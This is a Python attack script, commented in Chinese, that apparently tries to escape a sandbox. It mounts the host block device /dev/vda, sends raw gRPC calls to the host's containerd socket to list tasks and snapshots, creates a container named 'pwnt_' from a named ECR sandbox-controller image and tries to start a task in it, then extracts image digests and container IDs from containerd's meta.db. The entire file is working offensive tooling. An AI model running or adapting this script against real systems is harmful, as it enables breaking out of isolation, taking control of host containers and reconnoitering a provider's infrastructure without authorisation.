# -*- coding: utf-8 -*-
"""vda31_ctrd_fast: containerd 快速状态 - 列表 + meta.db 截断 + 创建容器
P1: Tasks/Containers/Snapshots 列表 (3s 超时)
P2: Containers/Create + Tasks/Create 尝试
P3: meta.db 头部 strings (限 8MB)
输出落盘 + 哨兵 V31R_DONE"""
import os, time, socket, ctypes, re, struct, subprocess

OUT = '/vercel/sandbox/v31r.out'
os.makedirs('/vercel/sandbox', exist_ok=True)
f = open(OUT, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def curl_h2(sockpath, path, body, ctype='application/grpc', t=4):
    try:
        tmp = '/tmp/curl_req_%d.bin' % os.getpid()
        open(tmp, 'wb').write(body)
        cmd = ['curl', '-sS', '--max-time', str(t), '--http2-prior-knowledge',
               '--unix-socket', sockpath, '-X', 'POST',
               '-H', 'Content-Type: %s' % ctype,
               '-H', 'TE: trailers',
               '--data-binary', '@%s' % tmp,
               'http://unix%s' % path]
        r = subprocess.run(cmd, capture_output=True, timeout=t + 2)
        return 'rc=%d' % r.returncode, r.stdout, r.stderr.decode('utf-8', errors='replace')[:150]
    except Exception as e:
        return 'EXC:%s' % type(e).__name__, b'', ''


def grpc_env(payload=b''):
    return b'\x00' + struct.pack('>I', len(payload)) + payload


def pstr(field_no, s):
    b = s.encode()
    tag = (field_no << 3) | 2
    out = bytearray()
    while tag > 127:
        out.append((tag & 127) | 128)
        tag >>= 7
    out.append(tag)
    l = len(b)
    while l > 127:
        out.append((l & 127) | 128)
        l >>= 7
    out.append(l)
    return bytes(out) + b


def show(tag, out):
    if not out:
        log('%s -> EMPTY' % tag)
        return
    strs = re.findall(rb'[\x20-\x7e]{5,}', out)
    log('%s -> %s' % (tag, [s.decode(errors='replace') for s in strs[:25]]))


def main():
    MOUNTED = False
    try:
        for ln in open('/proc/self/mountinfo', errors='replace'):
            if '/mnt/vdax' in ln:
                MOUNTED = True
                break
    except Exception:
        pass
    if not MOUNTED:
        os.makedirs('/mnt/vdax', exist_ok=True)
        ret = ctypes.CDLL(None).mount(b'/dev/vda', b'/mnt/vdax', b'xfs', 0, b'')
        log('mount ret=%d' % ret)

    csp = '/mnt/vdax/run/containerd/containerd.sock'

    # P1: 列表
    log('=== P1 lists ===')
    for tag, path, payload in [
        ('Tasks', '/containerd.services.tasks.v1.Tasks/List', b''),
        ('Containers', '/containerd.services.containers.v1.Containers/List', b''),
        ('Snapshots', '/containerd.services.snapshots.v1.Snapshots/List', pstr(1, 'snapshotter==blockfile')),
    ]:
        rc, out, err = curl_h2(csp, path, grpc_env(payload), t=3)
        show('%s [%s]' % (tag, rc), out)
        if err:
            log('  err: %s' % err)
        time.sleep(0.15)

    # P2: 创建容器
    log('=== P2 create ===')
    ctr_id = 'pwnt_%d' % int(time.time())
    img_ref = '977805900156.dkr.ecr.us-east-1.amazonaws.com/sandbox-controller@sha256:95fd06013f4e1708be914dc973663ab50e48d0045087340cc71cf903e2841b59'
    runtime_msg = pstr(1, 'io.containerd.runc.v2')
    container_msg = pstr(1, ctr_id) + pstr(2, img_ref) + pstr(3, runtime_msg) + pstr(4, 'overlayfs')
    rc, out, err = curl_h2(csp, '/containerd.services.containers.v1.Containers/Create', grpc_env(pstr(1, container_msg)), t=5)
    show('Create [%s]' % rc, out)
    if err:
        log('  err: %s' % err)
    time.sleep(0.2)
    rc, out, err = curl_h2(csp, '/containerd.services.tasks.v1.Tasks/Create', grpc_env(pstr(1, ctr_id)), t=5)
    show('TasksCreate [%s]' % rc, out)
    if err:
        log('  err: %s' % err)
    time.sleep(0.2)
    # 清理
    rc, out, err = curl_h2(csp, '/containerd.services.containers.v1.Containers/Delete', grpc_env(pstr(1, ctr_id)), t=4)
    show('Delete [%s]' % rc, out)

    # P3: meta.db 头部
    log('=== P3 meta.db head ===')
    try:
        p = '/mnt/vdax/var/lib/containerd/io.containerd.metadata.v1.bolt/meta.db'
        st = os.stat(p)
        log('meta.db size=%d' % st.st_size)
        with open(p, 'rb') as mf:
            head = mf.read(8 * 1024 * 1024)
        strs = re.findall(rb'[\x20-\x7e]{8,}', head)
        interesting = []
        for s in strs:
            t = s.decode(errors='replace')
            if any(k in t for k in ['ctr_', 'hvc_', 'sha256:', 'ecr', 'sandbox', 'snapshot', 'container', 'pwn', 'runc', 'blockfile']):
                interesting.append(t)
        log('meta.db strs (%d): %s' % (len(interesting), interesting[:50]))
    except Exception as e:
        log('meta.db ERR %s' % e)

    log('V31R_DONE')
    f.close()


if __name__ == '__main__':
    main()
